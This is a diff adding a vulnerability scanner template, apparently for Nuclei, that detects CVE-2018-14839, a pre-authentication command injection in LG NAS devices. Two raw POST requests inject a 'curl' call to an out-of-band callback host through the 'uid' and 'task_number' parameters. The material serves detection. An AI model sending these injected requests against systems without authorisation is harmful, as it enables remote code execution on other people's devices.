@@ -1,0 +1,58 @@
+id: lg-nas-rce
+
+info:
+  name: LG NAS Devices - Remote Code Execution
+  author: gy741
+  severity: critical
+  description: LG NAS devices contain a pre-auth remote command injection via the "password" parameter.
+  impact: |
+    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected device.
+  remediation: |
+    Apply the latest firmware update provided by LG to mitigate this vulnerability.
+  reference:
+    - https://www.vpnmentor.com/blog/critical-vulnerability-found-majority-lg-nas-devices/
+    - https://medium.com/@0x616163/lg-n1a1-unauthenticated-remote-command-injection-cve-2018-14839-9d2cf760e247
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-10818
+  classification:
+    cve-id: CVE-2018-14839
+    cwe-id: CWE-78
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    epss-score: 0.89354
+    epss-percentile: 0.99771
+    cpe: cpe:2.3:o:lg:n1a1_firmware:3718.510:*:*:*:*:*:*:*,cpe:2.3:h:lg:n1a1:-:*:*:*:*:*:*:*
+  metadata:
+    max-request: 2
+  tags: lg-nas,rce,oast,injection,vuln
+variables:
+  useragent: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /system/sharedir.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        &uid=10; curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'
+      - |
+        POST /en/php/usb_sync.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        &act=sync&task_number=1;curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_request
+        words:
+          - "User-Agent: {{useragent}}"
+# digest: 4a0a0047304502202789c7e18442247a05b0729d60da7dbe23f3bbe54b7c25aff20c05704dd349b9022100e1dcb1362c949e5fe464dc4cd01597a06bb9bc6b2ae34000476780c14da3d155:922c64590222798bb761d5b6d8e72950
